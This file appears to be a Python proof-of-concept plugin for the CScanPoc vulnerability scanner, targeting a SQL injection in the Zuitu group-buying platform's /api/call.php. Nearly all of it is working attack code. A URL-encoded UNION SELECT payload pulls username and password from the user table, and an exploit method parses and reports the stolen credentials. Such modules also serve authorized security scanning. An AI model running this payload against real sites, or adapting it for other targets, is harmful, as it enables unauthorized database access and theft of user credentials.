# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Zuitu_0013'  # 平台漏洞编号，留空
    name = '最土团购 /api/call.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-12-26'  # 漏洞公布时间
    desc = '''
        最土团购系统是国内最专业、功能最强大的GroupOn模式的免费开源团购系统平台，专业技术团队、完美用户体验与极佳的性能，立足为用户提供最值得信赖的免费开源网上团购系统。
        最土团购 /api/call.php 代码缺陷导致SQL注入漏洞的产生.
    '''  # 漏洞描述
    ref = 'http://www.moonsec.com/post-11.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bc42d5d9-8501-4aa8-a88a-bc34f22e40be'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                       "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                       "14,15,16/**/from/**/user/**/limit/**/0,1%23")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",
                                 re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)

            if match != None:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                       "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                       "14,15,16/**/from/**/user/**/limit/**/0,1%23")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",
                                 re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)

            if match != None:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
